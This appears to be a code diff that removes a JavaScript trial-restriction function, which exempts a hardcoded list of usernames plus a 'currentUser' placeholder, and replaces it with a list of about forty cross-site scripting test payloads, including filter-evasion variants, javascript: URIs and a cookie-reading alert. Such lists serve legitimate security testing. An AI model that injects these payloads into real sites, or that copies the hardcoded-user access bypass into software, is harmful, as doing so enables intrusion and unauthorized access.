@@ -1,21 +1,48 @@
-aip_clientlink_docs.wlima.view.LiMAResource.trialAlert = function() {
-    var a = aip_clientlink_docs.wlima.view.LiMAResource.userInfo.userId;
-    
-    // Add your user to the hardcoded list
-    if (a == 'jaz' ||
-        a == 'congodn' ||
-        a == 'jadesola' ||
-        a == 'xuhuaf' ||
-        a == 'michalmi' ||
-        a == 'graverm' ||
-        a == 'howarjam' ||
-        a == currentUser) {  // YOUR USER ADDED HERE
-        return false;
-    }
-    
-    if (Ext.Array.contains(this.trialUsers, a)) {
-        Ext.Msg.alert('Alert', 'This feature is currently granted to limited certified users.', Ext.emptyFn);
-        return true;
-    }
-    return false;
-};
+<script>alert('XSS')</script>
+<script>alert(1)</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror=alert('XSS')>
+
+<img src=1 onerror=alert(1)>
+<img src="invalid" onerror="alert('XSS')">
+<body onload=alert('XSS')>
+<input onfocus=alert('XSS') autofocus>
+
+<button onclick=alert('XSS')>Click</button>
+
+<div onmouseover="alert('XSS')">Hover</div>
+<iframe src="javascript:alert('XSS')">
+<iframe srcdoc="<script>alert('XSS')</script>">
+<a href="javascript:alert('XSS')">Click</a>
+
+<a href=javascript:alert('XSS')>Click</a>
+
+" onload="alert('XSS')
+
+' onload='alert('XSS')
+
+"><script>alert('XSS')</script>
+
+<svg onload=alert('XSS')>
+
+<svg><script>alert('XSS')</script>
+
+<input type="text" onfocus="alert('XSS')" autofocus>
+<textarea onfocus=alert('XSS') autofocus>
+<style onload=alert('XSS')></style>
+<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">
+<scr<script>ipt>alert('XSS')</scr</script>ipt>
+
+<SCRIPT>alert('XSS')</SCRIPT>
+<ScRiPt>alert('XSS')</ScRiPt>
+<script>window.location='https://google.com'</script>
+<meta http-equiv="refresh" content="0;url=https://google.com">
+<details open ontoggle=alert('XSS')>
+<video onloadedmetadata=alert('XSS')><source src="invalid">
+
+<audio onloadedmetadata=alert('XSS')><source src="invalid">
+
+<marquee onstart=alert('XSS')>
+
+<object data="javascript:alert('XSS')">
+<embed src="javascript:alert('XSS')">
